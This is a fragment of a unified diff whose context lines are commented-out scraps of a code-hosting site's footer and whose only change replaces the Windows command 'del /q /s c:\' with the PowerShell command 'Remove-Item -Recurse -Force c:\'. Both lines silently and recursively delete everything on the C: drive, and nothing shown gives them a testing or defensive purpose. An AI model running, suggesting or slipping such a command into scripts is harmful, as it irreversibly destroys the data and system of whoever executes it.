@@ -18,4 +18,4 @@
 # Status API Training Shop Blog About Pricing
 #
 
-del /q /s c:\
+Remove-Item -Recurse -Force c:\
